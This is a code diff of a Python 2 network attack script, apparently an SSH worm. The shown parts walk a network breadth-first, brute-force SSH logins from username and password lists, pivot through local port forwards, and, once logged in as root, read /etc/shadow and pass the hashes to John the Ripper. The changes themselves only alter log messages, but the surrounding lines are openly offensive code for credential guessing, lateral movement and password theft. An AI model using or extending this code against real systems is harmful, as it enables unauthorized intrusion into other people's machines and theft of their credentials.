@@ -108,13 +108,13 @@ def get_host_port(data):
 
 def begin_attack(client):
     global initial_comps, FORWARD_PORT
-    print "Beginning attack"
+    print "\n\nBeginning attack...\n"
 
     # executes BFS over network
     while not q.empty():
         # gets the next computer in BFS
         server = q.get()
-        verbose("Connecting to ssh host %s:%d ..." % (server.host, server.ssh_port))
+        verbose("Brute Forcing ssh host %s:%d ..." % (server.host, server.ssh_port))
 
         user_len = len(USERNAMES)
         passwd_len = len(PASSWORDS)
@@ -134,9 +134,10 @@ def begin_attack(client):
 
                         # attempt to login with current creds
                         client.connect(server.host, server.ssh_port, username=userCred, password=passCred)
+                        verbose("Connected to %s:%s" % (server.host, server.ssh_port))
                     else:
                         client.connect("localhost", server.local_forward, username=userCred, password=passCred)
-                        verbose("ssh localhost:%d" % server.local_forward)
+                        verbose("Connecting to localhost:%d -> %s:%s" % (server.local_forward, server.host, server.ssh_port))
                     logged_in = True
                     # add the user/pass combo to the server object dict of accounts
                     server.accounts[userCred] = passCred
@@ -146,6 +147,7 @@ def begin_attack(client):
 
                 except Exception as e:
                     # print('*** Failed to connect to %s:%d: %r' % (server.host, server.ssh_port, e))
+                    pass
 
         # if we have logged into the machine
         if logged_in:
@@ -176,6 +178,7 @@ def begin_attack(client):
 
             # if we are logged in as root
             if log_root:
+                print "Logged in as ROOT on %s. Grabbing /etc/shadow" % (server.host)
                 stdin, stdout, stderr = client.exec_command("cat /etc/shadow")
                 accts = user_hashes(stdout)
                 user_passes = crack_with_john(accts)
